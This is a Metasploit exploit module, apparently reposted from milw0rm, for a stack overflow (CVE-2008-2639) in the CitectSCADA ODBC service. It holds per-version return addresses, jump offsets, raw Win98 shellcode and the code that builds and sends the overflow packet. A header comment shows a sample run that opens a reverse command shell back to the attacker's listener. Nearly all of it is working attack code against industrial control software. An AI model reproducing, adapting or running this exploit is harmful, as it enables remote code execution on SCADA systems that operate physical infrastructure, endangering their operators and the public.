##
# $Id: citect_scada_odbc.rb
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
#
#
# msfcli exploit/windows/misc/citect_scada_odbc RHOST=192.168.2.45 PAYLOAD=windows/shell/reverse_ord_tcp LHOST=192.168.2.101  TARGET=2 E
# [*] Started reverse handler
# ...
# [*] Sending stage (474 bytes)
# [*] Command shell session 1 opened (192.168.2.101:4444 -> 192.168.2.45:1039)
#
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Citect\CitectSCADA\Bin>
#
# Arbitrary code has been sucessfully run on Windows XP SP2 and SP3, Win98 SE and Windows 2003 Server SP1
#
require 'msf/core'

module Msf

class Exploits::Windows::Misc::Citect_SCADA_ODBC < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CitectSCADA ODBC Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in CitectSCADA's ODBC daemon.
				This has only been tested against Citect v5, v6 and v7.
			},
			'Author'         => [ 'KF <kf_lists[at]digitalmunition.com>' ],
			'Version'        => '$Revision: 1 $',
			'References'     =>
				[
					['CVE', 'CVE-2008-2639'],
					['BID', '29634'],
					['URL', 'http://www.schneider-electric.com/sites/corporate/en/press/press-releases/viewer-press-releases.page?c_filepath=/templatedata/Content/Press_Release/data/en/shared/2005/10/20051019_schneider_electric_adds_scada_and_mes_capabilities_to_i.xml'],
					['URL', 'http://www.coresecurity.com/content/citect-scada-odbc-service-vulnerability','http://www.auscert.org.au/render.html?it=9433'],
					['URL', 'http://www.auscert.org.au/render.html?it=9433'],
					['URL', 'http://www.controsys.hu/anyagok/group_quality_assurance.pdf'],
					['URL', 'http://www.citect.com/documents/news_and_media/pr-citect-address-security.pdf'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00",
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',

			'Targets'        =>
				[
					# Small sample of potential targets... There ARE universal targets for *some* versions. The base address can varry unfortunately.
					['CiExceptionMailer.dll on XP Sp2 or SP3 5.42',     { 'Version' => '5.42',    'OS' => 'xp',    'Ret' => 0x003a530e, 'Jump' => 0xffffff11e9, 'Payload' => { 'Space' => 216  } } ],
					['CiExceptionMailer.dll on Server 2003 Sp2 6.0-r0', { 'Version' => '6.0-r0',  'OS' => '2003',  'Ret' => 0x003a6aad, 'Jump' => 0xffffff15e9, 'Payload' => { 'Space' => 212  } } ],
					['CiExceptionMailer.dll on XP Sp2 or SP3 6.0-r0',   { 'Version' => '6.0-r0',  'OS' => 'xp',    'Ret' => 0x0039cd5a, 'Jump' => 0xffffff11e9, 'Payload' => { 'Space' => 216  } } ],
					['CiExceptionMailer.dll on XP Sp2 or SP3 6.10',    { 'Version' => '6.10',    'OS' => 'xp',    'Ret' => 0x00501113, 'Jump' => 0xffffff11e9, 'Payload' => { 'Space' => 380  } } ],
					['CiExceptionMailer.dll on XP Sp2 or SP3 7.0-r0',   { 'Version' => '7.0-r0',  'OS' => 'xp',    'Ret' => 0x003e1e92, 'Jump' => 0xffffff11e9, 'Payload' => { 'Space' => 380  } } ],
					['CiExceptionMailer.dll on 2003 Server SP1 7.0-r0', { 'Version' => '7.0-r0',  'OS' => '2003',  'Ret' => 0x003d59d7, 'Jump' => 0xfffffe7be9, 'Payload' => { 'Space' => 376  } } ],
					['CiExceptionMailer.dll on Win98 5.50-r0',	    { 'Version' => '5.50-r0', 'OS' => 'win98', 'Ret' => 0x006dd8b7, 'Jump' => 0xffffff6fe9, 'Payload' => { 'Space' => 140  } } ],
					['CiExceptionMailer.dll on XP SP2 5.50-r0',	    { 'Version' => '5.50-r0', 'OS' => 'xp',    'Ret' => 0x003a5e90, 'Jump' => 0xffffff11e9, 'Payload' => { 'Space' => 216  } } ],
					['CiExceptionMailer.dll on 2003 Server 5.50-r0',    { 'Version' => '5.50-r0', 'OS' => '2003',  'Ret' => 0x003952ee, 'Jump' => 0xffffff15e9, 'Payload' => { 'Space' => 212  } } ],
					['Test Crash',	  			            { 'Version' => '666',     'OS' => 'test',  'Ret' => 0xdeadbeef, 'Jump' => 0xdeadbabeee, 'Payload' => { 'Space' => 8192 } } ],
				],

			'Privileged'     => false,
			'DisclosureDate' => 'June 11 2008'
			))

			register_options(
			[
				Opt::RPORT(20222)
			], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")
		if payload_space() != payload.encoded.length
			print_status("Metasploit payload bug... please check out from SVN")
			exit
		else
			print_status("Space: #{payload_space()}")
		end

		shortjmp   =    0xeb069090      # jump over garbage for SEH foo

		if(target['OS'] =~ /xp/)
			print_status("Using Windows XP Target")
		elsif (target['OS'] =~ /2003/)
			print_status("Using Windows 2003 Target")
		elsif (target['OS'] =~ /98/)
			print_status("no 98 foo yet")
		else (target['OS'] =~ /test/)
			print_status("Just testing.... don't mind me")
		end

		padding = 100  # Just fill up the end of the stack...

		# There is some redundant shit here... will be cleaned up soon enough...
		if (target['Version'] =~ /5.42/) || (target['Version'] =~ /6.0-r0/)
			filler = "\x90" * 10 + [target['Jump']].pack('Q')[0..4] + "\x90" * padding
			mal = payload.encoded + [shortjmp].pack("N") + [target.ret].pack("V") + filler
		elsif (target['Version'] =~ /6.10/) || (target['Version'] =~ /7.0-r0/)
			filler = [target['Jump']].pack('Q')[0..4] + "\x90" * padding
			mal = payload.encoded + [shortjmp].pack("N") + [target.ret].pack("V") + filler
		elsif (target['Version'] =~ /5.50-r0/)

			# This particular target encompases win98 windows XP and windows 2003 just so that no one feels left out.
			# EVERYONE *CAN* be exploited... not just the guys running the modern stuff. Someone only needs to take a bit
			# of time to have a robust exploit for any platform or version they choose...

			if(target['OS'] =~ /win98/)
				hop1 = 0xebb69090     # Short jump into small 72 byte buffer space - EBb6
				hop2 = target['Jump'] # Near jump into begining of entire buffer... leaves 140 chars of space.
				seh = [target.ret].pack("V") # Call EAX from CiExceptionMailer.dll

				# Description : It is 110 Byte Shellcode which Pops up Message Box Under win98
				# This is just sample code from the milw0rm...its using static addresses from MY win98
				hell =
				"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb" +
				"\xd0\x76\xf7\xbf" +   # LoadLibraryA(libraryname) IN win98
				"\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb" +
				"\xa8\x6d\xf7\xbf" +   # GetProcAddress(hmodule,functionname)
				"\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51" +
				"\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff" +
				"\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff" +
				"\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff" +
				"\xff" + "PWNED." + "\x4e"
				mal = "\x90" * (payload_space - hell.length) + hell + [hop2].pack('Q')[0..4] + "Z" * 67 + [hop1].pack("N") + seh + "\x41" * padding
			elsif target['OS'] =~ /xp/ || target['OS'] =~ /2003/
				filler = "\x90" * 10 + [target['Jump']].pack('Q')[0..4] + "\x90" * padding
				mal = payload.encoded + [shortjmp].pack("N") + [target.ret].pack("V") + filler
			end

		else (target['Version'] =~ /666/)
			# Use this to find offsets for other versions that were not provided.
			mal = Rex::Text.pattern_create(payload_space, Rex::Text::DefaultPatternSets)
			print_status("Use pattern_offset.rb to find the length")
		end

		# Open your eyes people... listen carefully to the rhetoric. There is no spoon.
		wakeup = [0x0000000002].pack('Q')[0..4] + [mal.length].pack("N") + mal

		len = [wakeup.length].pack("N")
		sock.put(len)
		sock.put(wakeup)
		print_status("Sent malicious ODBC packet...")

		handler
		print_status("Citect and other SCADA and Control vendors have been communicating potential " +
			"vulnerabilities of control systems when they are connected to the internet for some time. ")
		print_status("However, Citect believes this is only relevant to a company using ODBC technology and " +
			"directly connecting its system to the internet with no security in place -")
		print_status("a situation unlikely in todayâ€™s business environment. ")

		disconnect
	end

end
end

# milw0rm.com [2008-09-05]